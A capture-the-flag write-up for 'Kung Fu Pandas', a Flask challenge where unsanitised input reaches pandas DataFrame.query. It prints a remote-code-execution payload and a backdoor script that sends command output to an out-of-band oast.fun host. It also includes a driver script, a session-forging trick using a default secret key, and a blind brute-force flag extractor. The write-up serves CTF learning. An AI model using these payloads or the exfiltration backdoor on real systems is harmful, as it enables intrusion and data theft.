Kung Fu Pandas 


Challange Description:  

One often finds his destiny on the path he takes to avoid it... 

Author: rubick 

Url: http://146.190.104.134:8888/ 


Challange Concept: We were given three files for this challenge: app.py, requirements.txt, and Dockerfile. The app.py file is a simple flask application that uses pandas dataframe instead of sql for authentication. from the dockerfile, we can see that this was hosted on python:3.8-slim-buster image. 


Initial Thoughts: The first thing that came to mind was to try ssti on landing page as username was being displayed on the page. However, sessions were created after successful logins, but funnier thing was that app.secret_key of remote application was same as the provided source code which is: your_secret_key. This made it easier to create a session on local server and bypass the login on remote server. I had modified the local app.py to include the following code before `if not user_data.empty` condition: `session['username'] = username`. Now it does not matter if username and password is valid, session will be created, and we will be logged in as given username. So, I created sessions with some common ssti payloads like {7*7}, {{7*7}}, ${7*7}. Then copied the session cookie and used it on remote server. I was able to login with arbitrary username but ssti was not working. 
![Screenshot_20240422_140259](https://github.com/abbishal/CTF-Writeup/assets/64602552/86eab9bd-6b02-4f21-9326-4c3be78b86b0)


Vulnerability: The vulnerability in this challenge was in the python module pandas. The use of pandas’ dataframe query method without sanitizing the user input can be exploited by users. That’s mean vulnerability lies in this line of code: `user_data = users_df.query(f"username == '{username}' and password == '{password}'")`. 

After some research about pandas' query method, found that it can import local variables and functions with @. So, we can manipulate this to read variables or even execute arbitrary code. I used the following payload to execute arbitrary code:  

`a'+(@pd.io.common.os.popen('COMMANDS').read())+'` 

This payload will execute the command, but problem was it was blind rce (verified locally by creating a poc file). Then I tried to use curl/wget for exfiltering data. But it was not working as docker image used for this challenge does not contain these binaries. After a lot of try in local server I tried to create a python script on the /tmp folder so I can use python modules to exfilter command outputs. 

first of all I created a simple python script that doesn't require python modules that are not available in docker image. Here is the script:  

```
import urllib.request 

import base64 

import os 

import sys 

cmd = sys.argv[1] 

cmd = base64.b64decode(cmd).decode() 

out = base64.b64encode(os.popen(cmd).read().encode()).decode() 

a = urllib.request.Request('https://uedgcbrrpqtsyzcokfty14m1hkxgds409.oast.fun/?'+out) 

urllib.request.urlopen(a) 

```

 This python script will take cmd input as basee64 from the cmdline. Then decode it and run the command, finally will send the output on our server as base64 encoded data. 

But we cannot input that script as username on login form as it is multiline and will make confusion with other (',"). So first encoded this script to base64, then used this payload on username form: `a'+(@pd.io.common.os.popen('echo base64_data | base64 -d > /tmp/test.py').read())+'`. This command will decode the script and store it to /tmp/test.py file. 

 

Now we have backdoor in the server. We can just run the python script and get all the outputs back to our server. 

Used this script to send commands to server when finding the flag file: 
```
import requests 

import base64 

cmd = "cat users.csv" 

cmd = base64.b64encode(cmd.encode()).decode() 

requests.post("http://146.190.104.134:8888/login", data={"username": f"a'+(@pd.io.common.os.popen('python3 /tmp/test.py {cmd}').read())+'", "password": "ftfgfkjf"}) 

```

 

Finally I have read the flag with this payload as username: `a'+(@pd.io.common.os.popen('python3 /tmp/test.py Y2F0IHVzZXJzLmNzdg==').read())+'`. 
![image](https://github.com/abbishal/CTF-Writeup/assets/64602552/92658fb5-0e29-4a74-acd4-1464c2de2b60)

![image](https://github.com/abbishal/CTF-Writeup/assets/64602552/59ee29df-e760-49fc-9187-e30792f1e86d)

 

But wait, was this intended to do in this way for a challenge for 300 points? 

After the event I asked the author about intended solution, and he said it was something like pattern matching. 

 

 

 

 

 

So, I had decided to solve this also in intended way. with the reference of https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.str.contains.html I found that how can we use query to return data if it contains some specific string. also we knew flag format for challenge must be `flag{}` or `iutctf`. After trying some payloads to check if any username or password have initials of flags I found this payload as password will return true: `' or password.str.contains('iutctf{') or 'a' == 'b`. Which means one of the passwords has flag. Why it is working on password field and not username? because if we put this payload in username it will evaluate like this on backend `username == '' or password.str.contains('iutctf{') or 'a' == 'b' and password == 'test'` which will always return false as `False or True and False` is False. but `username == 'test' and password == '' or password.str.contains('iutctf{') or 'a' == 'b'` will return True as `False and False or True` is True. Now let's write a python script to automate the process of finding the flag: 

 

```

from requests import post 

import string 

characters = string.ascii_letters + string.digits + "{}_" 

flag = 'iutctf{' 

while flag[-1] != '}': 

    for i in characters: 

        r = post("http://146.190.104.134:8888/login", data={"username": "test", "password": f"' or password.str.contains('{flag+i}') or 'a' == 'b"}, allow_redirects=False) 

        if r.status_code == 302: 

            flag += i 

            print(flag) 

            break 

print(flag) 
```

flag: `iutctf{th3r3_1s_alw4ys_s0m37h1ng_m0r3_t0_l3arn_3v3n_f0r_a_m4st3r}`
